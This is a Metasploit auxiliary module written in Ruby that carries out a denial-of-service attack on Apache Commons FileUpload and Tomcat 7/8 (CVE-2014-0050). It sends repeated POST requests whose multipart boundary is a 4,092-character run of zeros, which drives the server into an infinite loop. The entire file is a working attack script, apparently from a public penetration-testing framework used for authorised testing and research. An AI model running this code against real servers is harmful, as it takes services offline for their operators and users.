##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Apache Commons FileUpload and Apache Tomcat DoS',
        'Description' => %q{
          This module triggers an infinite loop in Apache Commons FileUpload 1.0
          through 1.3 via a specially crafted Content-Type header.
          Apache Tomcat 7 and Apache Tomcat 8 use a copy of FileUpload to handle
          mime-multipart requests, therefore, Apache Tomcat 7.0.0 through 7.0.50
          and 8.0.0-RC1 through 8.0.1 are affected by this issue. Tomcat 6 also
          uses Commons FileUpload as part of the Manager application.
        },
        'Author' => [
          'Unknown', # This issue was reported to the Apache Software Foundation and accidentally made public.
          'ribeirux' # metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2014-0050'],
          ['URL', 'https://tomcat.apache.org/security-8.html'],
          ['URL', 'https://tomcat.apache.org/security-7.html']
        ],
        'DisclosureDate' => '2014-02-06',
        'Notes' => {
          'Stability' => [CRASH_SERVICE_DOWN],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('TARGETURI', [ true, 'The request URI', '/']),
        OptInt.new('RLIMIT', [ true, 'Number of requests to send', 50])
      ]
    )
  end

  def run
    boundary = '0' * 4092
    opts = {
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.to_s),
      'ctype' => "multipart/form-data; boundary=#{boundary}",
      'data' => "#{boundary}00000",
      'headers' => {
        'Accept' => '*/*'
      }
    }

    # XXX: There is rarely, if ever, a need for a 'for' loop in Ruby
    # This should be rewritten with 1.upto() or Enumerable#each or
    # something
    for x in 1..datastore['RLIMIT']
      print_status("Sending request #{x} to #{peer}")
      begin
        c = connect
        r = c.request_cgi(opts)
        c.send_request(r)
        # Don't wait for a response
      rescue ::Rex::ConnectionError => e
        print_error("Unable to connect: '#{e.message}'")
        return
      ensure
        disconnect(c) if c
      end
    end
  end
end
